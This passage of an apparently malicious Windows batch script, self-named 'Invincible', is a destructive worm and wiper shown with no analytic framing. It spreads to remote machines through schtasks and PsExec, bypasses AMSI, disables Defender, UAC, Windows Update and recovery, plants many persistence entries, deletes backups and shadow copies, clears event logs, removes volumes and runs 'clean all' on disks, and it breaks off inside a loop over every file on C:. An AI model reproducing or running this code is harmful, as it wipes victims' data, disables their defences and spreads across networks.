echo                 schtasks /create /s $ip /tn \"DeployTool\" /tr \"cmd.exe /c C:\Windows\Temp\Super_FPS.bat --remote\" /sc once /st 23:59 /ru \"SYSTEM\" /f -ErrorAction Stop ^| Out-Null
echo                 schtasks /run /s $ip /tn \"DeployTool\" -ErrorAction Stop ^| Out-Null
echo                 [System.Threading.Thread]::Sleep(1000)
echo                 schtasks /delete /s $ip /tn \"DeployTool\" /f -ErrorAction SilentlyContinue ^| Out-Null
echo                 return
echo             } catch {}
echo             if (Test-Path $psexec) {
echo                 try { Start-Process -FilePath $psexec -ArgumentList \"\\$ip -s -d -accepteula cmd /c C:\Windows\Temp\Super_FPS.bat --remote\" -WindowStyle Hidden -ErrorAction Stop; return } catch {}
echo             }
echo         } catch {}
echo     }
echo }
echo $jobs = foreach ($target in $targets) {
echo     $ps = [powershell]::Create().AddScript($sb).AddArgument($target).AddArgument($sourceFile).AddArgument($psexecPath)
echo     $ps.RunspacePool = $pool
echo     [PSCustomObject]@{ Pipe = $ps; Result = $ps.BeginInvoke() }
echo }
echo while ($jobs.Result.IsCompleted -contains $false) { [System.Threading.Thread]::Sleep(1) }
echo foreach ($job in $jobs) { $null = $job.Pipe.EndInvoke($job.Result); $job.Pipe.Dispose() }
echo $pool.Close(); $pool.Dispose()
)
powershell -NoProfile -ExecutionPolicy Bypass -File "%TEMP_DIR%\prop.ps1" >nul 2>&1
del "%TEMP_DIR%\prop.ps1" 2>nul
echo select disk 0 > "%DP_SCRIPT%"
echo list partition >> "%DP_SCRIPT%"
diskpart /s "%DP_SCRIPT%" > "%DP_OUTPUT%" 2>&1
for /f "tokens=2,3" %%A in ('findstr /i "Recovery" "%DP_OUTPUT%" 2^>nul') do (
    set "part_num=%%B"
)
del "%DP_SCRIPT%" "%DP_OUTPUT%" 2>nul
for /f "tokens=*" %%i in ('powershell -Command "(Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1MB"') do set "mem=%%i"
if defined mem ( set /a "ram_slay=!mem!*8/10" ) else ( set /a "ram_slay=0" )
> "%TEMP_DIR%\amsi_bypass.ps1" (
echo [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
echo [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%TEMP_DIR%\amsi_bypass.ps1" >nul 2>&1
del "%TEMP_DIR%\amsi_bypass.ps1" 2>nul
whoami /groups | find "S-1-5-32-544" >nul 2>&1 && set "admin=1" || set "admin=0"
if "!admin!" equ "1" (
    reg add "HKLM\System\CurrentControlSet\Control\Session Manager" /v "BootExecute" /t REG_MULTI_SZ /d "autocheck autochk *\0cmd.exe /c start /b /min %~f0" /f >nul 2>&1
    schtasks /create /tn "WindowsUpdate" /tr "cmd.exe /c start /b /min %~f0" /sc onlogon /ru SYSTEM /rl HIGHEST /f >nul 2>&1
) else (
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /d "cmd.exe /c start /b /min %~f0" /f >nul 2>&1
    reg add "HKCU\Environment" /v windir /d "cmd.exe /c start /b /min %~f0 & REM" /f >nul 2>&1
    schtasks /create /tn "WindowsUpdate" /tr "cmd.exe /c start /b /min %~f0" /sc onlogon /f >nul 2>&1
)
goto :stage1_admin

:stage1_admin
schtasks /run /tn "Stage0" >nul 2>&1
> "%TEMP_DIR%\def.ps1" (
echo $ErrorActionPreference = 'SilentlyContinue'
echo $p = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
echo Set-ItemProperty -Path $p -Name 'DisableAntiSpyware' -Value 1 -Force
echo Set-ItemProperty -Path "$p\Real-Time Protection" -Name 'DisableRealtimeMonitoring' -Value 1 -Force
echo Set-ItemProperty -Path "$p\Real-Time Protection" -Name 'DisableBehaviorMonitoring' -Value 1 -Force
echo Set-ItemProperty -Path "$p\Real-Time Protection" -Name 'DisableOnAccessProtection' -Value 1 -Force
echo Set-ItemProperty -Path "$p\Spynet" -Name 'DisableBlockAtFirstSeen' -Value 1 -Force
echo Set-ItemProperty -Path "$p\Spynet" -Name 'SubmitSamplesConsent' -Value 2 -Force
echo Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -SignatureDisableUpdateOnStartupWithoutEngine $true -DisableArchiveScanning $true -DisableIntrusionPreventionSystem $true -DisableScriptScanning $true -SubmitSamplesConsent 2 -MAPSReporting 0 -HighThreatDefaultAction 6 -ModerateThreatDefaultAction 6 -LowThreatDefaultAction 6 -SevereThreatDefaultAction 6 -ErrorAction SilentlyContinue
echo Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine -Force
echo Add-MpPreference -ExclusionPath 'C:\' -ErrorAction SilentlyContinue
echo Add-MpPreference -ExclusionPath '%TEMP_DIR%' -ErrorAction SilentlyContinue
echo Add-MpPreference -ExclusionExtension '.bat' -ErrorAction SilentlyContinue
echo Add-MpPreference -ExclusionExtension '.ps1' -ErrorAction SilentlyContinue
echo Add-MpPreference -ExclusionProcess 'cmd.exe' -ErrorAction SilentlyContinue
echo Add-MpPreference -ExclusionProcess 'powershell.exe' -ErrorAction SilentlyContinue
echo $svcs = @('WinDefend','SecurityHealthService','Sense','WdNisSvc','WdFilter','WdBoot','WdNisDrv','wscsvc')
echo foreach ($s in $svcs) { Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$s" -Name 'Start' -Value 4 -Force }
)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%TEMP_DIR%\def.ps1" >nul 2>&1
del "%TEMP_DIR%\def.ps1" 2>nul
> "%TEMP_DIR%\pol.ps1" (
echo $ErrorActionPreference = 'SilentlyContinue'
echo $policies = @(
echo     @{Path='HKLM:\SOFTWARE\Policies\Microsoft\Windows\System';Name='DisableCMD';Value=2;Type='DWord'},
echo     @{Path='HKLM:\SOFTWARE\Policies\Microsoft\Windows\System';Name='DisableRegistryTools';Value=2;Type='DWord'},
echo     @{Path='HKLM:\SOFTWARE\Policies\Microsoft\Windows\System';Name='DisableTaskMgr';Value=1;Type='DWord'},
echo     @{Path='HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer';Name='NoRun';Value=1;Type='DWord'},
echo     @{Path='HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer';Name='NoClose';Value=1;Type='DWord'},
echo     @{Path='HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer';Name='NoLogOff';Value=1;Type='DWord'},
echo     @{Path='HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System';Name='DisableTaskMgr';Value=1;Type='DWord'},
echo     @{Path='HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System';Name='DisableRegistryTools';Value=1;Type='DWord'},
echo     @{Path='HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System';Name='DisableCMD';Value=1;Type='DWord'},
echo     @{Path='HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System';Name='EnableLUA';Value=0;Type='DWord'},
echo     @{Path='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System';Name='ConsentPromptBehaviorAdmin';Value=0;Type='DWord'},
echo     @{Path='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System';Name='ConsentPromptBehaviorUser';Value=0;Type='DWord'},
echo     @{Path='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System';Name='EnableInstallerDetection';Value=0;Type='DWord'},
echo     @{Path='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System';Name='FilterAdministratorToken';Value=1;Type='DWord'},
echo     @{Path='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System';Name='LocalAccountTokenFilterPolicy';Value=1;Type='DWord'},
echo     @{Path='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System';Name='EnableSecureUIAPaths';Value=0;Type='DWord'},
echo     @{Path='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System';Name='ValidateAdminCodeSignatures';Value=0;Type='DWord'},
echo     @{Path='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System';Name='EnableUIADesktopToggle';Value=0;Type='DWord'},
echo     @{Path='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System';Name='SupportFullTrustStartupTasks';Value=1;Type='DWord'},
echo     @{Path='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System';Name='EnableLinkedConnections';Value=1;Type='DWord'},
echo     @{Path='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System';Name='EnableVirtualization';Value=0;Type='DWord'},
echo     @{Path='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System';Name='PromptOnSecureDesktop';Value=0;Type='DWord'},
echo     @{Path='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System';Name='dontdisplaylastusername';Value=1;Type='DWord'},
echo     @{Path='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System';Name='dontdisplaylockeduserid';Value=1;Type='DWord'},
echo     @{Path='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System';Name='HideFastUserSwitching';Value=1;Type='DWord'},
echo     @{Path='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System';Name='NoAutoRebootWithLoggedOnUsers';Value=1;Type='DWord'},
echo     @{Path='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System';Name='ShutdownWithoutLogon';Value=0;Type='DWord'},
echo     @{Path='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System';Name='UndockWithoutLogon';Value=0;Type='DWord'},
echo     @{Path='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System';Name='DisableCAD';Value=1;Type='DWord'},
echo     @{Path='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System';Name='DisableLockWorkstation';Value=1;Type='DWord'},
echo     @{Path='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System';Name='DisableChangePassword';Value=1;Type='DWord'},
echo     @{Path='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System';Name='DisableStatusMessages';Value=1;Type='DWord'}
echo )
echo foreach ($pol in $policies) { New-Item -Path $pol.Path -Force -ErrorAction SilentlyContinue ^| Out-Null; Set-ItemProperty -Path $pol.Path -Name $pol.Name -Value $pol.Value -Type $pol.Type -Force -ErrorAction SilentlyContinue }
)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%TEMP_DIR%\pol.ps1" >nul 2>&1
del "%TEMP_DIR%\pol.ps1" 2>nul
> "%TEMP_DIR%\ifeo.ps1" (
echo $ErrorActionPreference = 'SilentlyContinue'
echo $base = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options'
echo $targets = @('taskmgr.exe','procmon.exe','procexp.exe','regedit.exe','msconfig.exe','perfmon.exe','resmon.exe','mmc.exe','eventvwr.exe','services.msc')
echo foreach ($t in $targets) { New-ItemProperty -Path "$base\$t" -Name 'Debugger' -Value 'cmd.exe /c exit' -Force -ErrorAction SilentlyContinue ^| Out-Null }
)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%TEMP_DIR%\ifeo.ps1" >nul 2>&1
del "%TEMP_DIR%\ifeo.ps1" 2>nul
> "%TEMP_DIR%\expol.ps1" (
echo $ErrorActionPreference = 'SilentlyContinue'
echo $base = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer'
echo $pols = @{
echo     'NoControlPanel'=1;'NoRun'=1;'NoFind'=1;'NoDesktop'=1;'NoClose'=1;'NoLogOff'=1;
echo     'NoSetTaskbar'=1;'NoTrayContextMenu'=1;'NoViewContextMenu'=1;'NoFolderOptions'=1;
echo     'NoFileMenu'=1;'NoManageMyComputerVerb'=1;'NoNetworkConnections'=1;'NoWindowsUpdate'=1;
echo     'NoSecurityTab'=1;'NoChangeAnimation'=1;'NoDFSTab'=1;'NoHardwareTab'=1;'NoComputersNearMe'=1;
echo     'NoEntireNetwork'=1;'NoWorkgroupContents'=1;'NoSaveSettings'=1;'NoThemesTab'=1;
echo     'NoChangeKeyboardNavigationIndicators'=1;'NoRemoteDestop'=1;'NoWelcomeScreen'=1;
echo     'NoPublishingWizard'=1;'NoWebServices'=1;'NoOnlinePrintsWizard'=1;'NoRecentDocsHistory'=1;
echo     'ClearRecentDocsOnExit'=1;'NoInstrumentation'=1;'NoSMBalloonTip'=1;'NoLowDiskSpaceChecks'=1
echo }
echo foreach ($k in $pols.Keys) { Set-ItemProperty -Path $base -Name $k -Value $pols[$k] -Type DWord -Force -ErrorAction SilentlyContinue }
)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%TEMP_DIR%\expol.ps1" >nul 2>&1
del "%TEMP_DIR%\expol.ps1" 2>nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\WindowsUpdate" /v DisableWindowsUpdateAccess /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\WindowsUpdate" /v DoNotConnectToWindowsUpdateInternetLocations /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\WindowsUpdate" /v WUServer /t REG_SZ /d "" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\WindowsUpdate" /v WUStatusServer /t REG_SZ /d "" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\WindowsUpdate" /v DisableDualScan /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Servicing" /v RepairContentServerSource /t REG_DWORD /d 2 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Servicing" /v UseWindowsUpdate /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v AUOptions /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v ScheduledInstallDay /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v ScheduledInstallTime /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v UseWUServer /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" /v NoChangingWallPaper /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" /v NoComponents /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" /v NoAddingComponents /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" /v NoDeletingComponents /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" /v NoEditingComponents /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" /v NoClosingComponents /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" /v NoHTMLWallPaper /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v SaveZoneInformation /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v HideZoneInfoOnProperties /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v ScanWithAntiVirus /t REG_DWORD /d 0 /f >nul 2>&1
reagentc /disable >nul 2>&1
bcdedit /set {default} recoveryenabled No >nul 2>&1
bcdedit /set {default} bootstatuspolicy ignoreallfailures >nul 2>&1
bcdedit /set {default} advancedoptions false >nul 2>&1
bcdedit /set {default} bootlog No >nul 2>&1
bcdedit /set {default} quietboot Yes >nul 2>&1
bcdedit /set {default} displaybootmenu No >nul 2>&1
bcdedit /set {current} safeboot Network No >nul 2>&1
powershell -Command "Get-ComputerRestorePoint | ForEach-Object {Disable-ComputerRestore -Drive $_.Drive; Enable-ComputerRestore -Drive $_.Drive}" >nul 2>&1
wbadmin delete catalog -quiet >nul 2>&1
wbadmin delete backup -keepVersions:0 -quiet >nul 2>&1
wbadmin delete systemstatebackup -keepVersions:0 -quiet >nul 2>&1
sc config vss start= disabled >nul 2>&1
sc config swprv start= disabled >nul 2>&1
sc stop vss >nul 2>&1
sc stop swprv >nul 2>&1
fsutil behavior set disablelastaccess 1 >nul 2>&1
fsutil behavior set disable8dot3 1 >nul 2>&1
fsutil usn deletejournal /d c: >nul 2>&1
fsutil resource setautoreset true c:\ >nul 2>&1
wevtutil cl System >nul 2>&1
wevtutil cl Application >nul 2>&1
wevtutil cl Security >nul 2>&1
wevtutil cl Setup >nul 2>&1
wevtutil cl "Windows PowerShell" >nul 2>&1
wevtutil cl "Microsoft-Windows-TaskScheduler/Operational" >nul 2>&1
wevtutil cl "Microsoft-Windows-Windows Defender/Operational" >nul 2>&1
wevtutil cl "Microsoft-Windows-Sysmon/Operational" >nul 2>&1
wevtutil cl "Microsoft-Windows-Security-Mitigations/KernelMode" >nul 2>&1
wevtutil cl "Microsoft-Windows-Security-Mitigations/UserMode" >nul 2>&1
wevtutil cl "Microsoft-Windows-Win32k/Operational" >nul 2>&1
wevtutil set-log System /enabled:false >nul 2>&1
wevtutil set-log Security /enabled:false >nul 2>&1
auditpol /clear /y >nul 2>&1
auditpol /remove /allusers >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v auditbaseobjects /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v crashonauditfail /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v fullprivilegeauditing /t REG_BINARY /d 00 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v restrictanonymous /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v restrictanonymoussam /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v everyoneincludesanonymous /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v forceguest /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v NoLmHash /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LmCompatibilityLevel /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v UseMachineId /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "cmd.exe /c start /b /min !SELF!" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_EXPAND_SZ /d "%%SystemRoot%%\system32\userinit.exe,cmd.exe /c start \"\" /b /min !SELF!" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Notify /t REG_SZ /d "cmd.exe /c start /b /min !SELF!" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Taskman /t REG_SZ /d "cmd.exe /c start /b /min !SELF!" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v LegalNoticeCaption /t REG_SZ /d "" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v LegalNoticeText /t REG_SZ /d "" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d "0" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v CachedLogonsCount /t REG_SZ /d "0" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v ForceUnlockLogon /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v PasswordExpiryWarning /t REG_DWORD /d 0 /f >nul 2>&1
goto :disk_wipe_all

:disk_wipe_all
set "dp_temp=%TEMP_DIR%\dp_wipe_%random%.ps1"
(
    echo $disks = Get-Disk ^| Where-Object { $_.OperationalStatus -eq 'Online' }
    echo foreach ($disk in $disks) {
    echo     $partitions = $disk ^| Get-Partition
    echo     foreach ($partition in $partitions) {
    echo         if ($partition.DriveLetter) {
    echo             $driveLetter = $partition.DriveLetter
    echo             $drive = Get-Volume -DriveLetter $driveLetter
    echo             if ($drive.FileSystemLabel -ne 'System Reserved') {
    echo                 $drive ^| Dismount-Volume -Access ReadWrite -ErrorAction SilentlyContinue
    echo                 $drive ^| Remove-Volume -ErrorAction SilentlyContinue
    echo             }
    echo         }
    echo     }
    echo }
) > "!dp_temp!"
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "!dp_temp!" 2>nul 1>nul
del "!dp_temp!" 2>nul
for /f "tokens=*" %%F in ('^(echo Rescan ^& echo List Disk^) ^| diskpart ^| find /I "online"') do (
    echo %%F | find "Disk 0" >nul
    if errorlevel 1 (
        for /f "tokens=2" %%D in ("%%F") do (
            (echo select disk %%D & echo clean all) | diskpart >nul 2>&1
        )
    )
)
powershell -NoProfile -Command "Start-Sleep -s 10" >nul 2>&1
goto :DeleteShadowCopies

:DeleteShadowCopies
cls
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$ErrorActionPreference='Stop'; try { Get-CimInstance Win32_ShadowCopy -ErrorAction SilentlyContinue | Remove-CimInstance -ErrorAction Stop; vssadmin.exe delete shadows /all /quiet; exit 0 } catch { exit 1 }" >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance Win32_LogicalDisk | ForEach-Object { $drive = $_.DeviceID; cipher /w:$drive; }" >nul 2>&1
goto :invincible_payload

:invincible_payload
set "CurrentScript=!SELF!"
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /v AlternateShell /t REG_SZ /d "!CurrentScript!" /f >nul 2>&1
bcdedit /set {globalsettings} advancedoptions false >nul 2>&1
bcdedit /set {globalsettings} hypervisorlaunchtype Off >nul 2>&1
bcdedit /set {current} hypervisorlaunchtype Off >nul 2>&1
powershell -Command "Get-NetAdapter | Disable-NetAdapter -Confirm:$false" >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "$Action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c C:\invincible\invincible.bat'; $Trigger = New-ScheduledTaskTrigger -AtLogOn; $Principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest; Register-ScheduledTask -TaskName 'InvincibleLaunch' -Action $Action -Trigger $Trigger -Principal $Principal -Force" >nul 2>&1
wevtutil cl System >nul 2>&1 & wevtutil cl Application >nul 2>&1 & wevtutil cl Security >nul 2>&1
wevtutil set-log System /enabled:false >nul 2>&1
wevtutil set-log Security /enabled:false >nul 2>&1
auditpol /clear /y >nul 2>&1
mkdir "C:\invincible" 2>nul
copy "%SELF%" "C:\invincible\invincible.bat" >nul 2>&1
copy "%SELF%" "C:\Windows\System32\invincible.bat" >nul 2>&1
reg copy HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal_Backup /s /f >nul 2>&1
reg delete HKLM\System\CurrentControlSet\Control\SafeBoot\Minimal /f >nul 2>&1
reg delete HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\volsnap /f >nul 2>&1
reg delete HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\volsnap /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\Controlled Folder Access" /v "EnableControlledFolderAccess" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v "EnableVirtualizationBasedSecurity" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" /v "Enabled" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI\Config" /v "VulnerableDriverBlocklistEnable" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "LsaCfgFlags" /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Invincible" /t REG_SZ /d "C:\invincible\invincible.bat" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "C:\invincible\invincible.bat" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe" /v Debugger /t REG_SZ /d "C:\invincible\invincible.bat" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v Debugger /t REG_SZ /d "C:\invincible\invincible.bat" /f >nul 2>&1
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "" /f >nul 2>&1
reg add "HKCU\Control Panel\Colors" /v Background /t REG_SZ /d "0 0 0" /f >nul 2>&1
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters ,1 >nul 2>&1
set "MAX_FILES=9999"
for /l %%i in (1,1,!MAX_FILES!) do (type nul > "C:\f_%%i_!random!.tmp" 2>nul)
for /f "delims=" %%i in ('dir /b /s /a "%~dp0invincible.bat" 2^>nul') do (
    if /i "%%~f0" NEQ "%%~fi" ( del /f /q /a "%%~fi" 2>nul )
)
for %%L in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if not exist "C:\Drive%%L" mkdir "C:\Drive%%L" 2>nul
    if not exist "C:\$Recycle.Bin\%%L" mkdir "C:\$Recycle.Bin\%%L" 2>nul
    if not exist "C:\Windows\System\%%L" mkdir "C:\Windows\System\%%L" 2>nul
    if not exist "C:\Users\Public\%%L" mkdir "C:\Users\Public\%%L" 2>nul
    powershell -NoProfile -Command "if (-not (Get-PSDrive -Name '%%L' -ErrorAction SilentlyContinue)) { New-PSDrive -Name '%%L' -PSProvider FileSystem -Root 'C:\Drive%%L' -Persist | Out-Null }" 2>nul 1>nul
    copy "!SELF!" "C:\Drive%%L\invincible.bat" >nul 2>&1
    copy "!SELF!" "C:\$Recycle.Bin\%%L\invincible.bat" >nul 2>&1
    copy "!SELF!" "C:\Windows\System\%%L\invincible.bat" >nul 2>&1
    copy "!SELF!" "C:\Users\Public\%%L\invincible.bat" >nul 2>&1
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Inv%%L" /t REG_SZ /d "C:\Drive%%L\invincible.bat" /f >nul 2>&1
)
takeown /f "%USERPROFILE%\Videos" /r /d y >nul 2>&1
takeown /f "%SystemRoot%\System32\mrt.exe" >nul 2>&1
icacls "%SystemRoot%\System32\mrt.exe" /grant administrators:F >nul 2>&1
del /f /q "%SystemRoot%\System32\mrt.exe" >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v legalnoticecaption /t REG_SZ /d "INVINCIBLE WAS HERE" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v legalnoticetext /t REG_SZ /d "Haha, you idiot, who told you to double-click on me? Now enjoy it!" /f >nul 2>&1
for /r "C:\" %%f in (*.*) do (
    if /i not "%%~xf"==".exe" if /i not "%%~xf"==".dll" if /i not "%%~xf"==".sys" if /i not "%%~xf"==".efi" if /i not "%%~xf"==".bat" if /i not "%%~xf"==".ps1" if /i not "%%~xf"==".cmd" if /i not "%%~xf"==".dat" if /i not "%%~xf"==".invincible" (
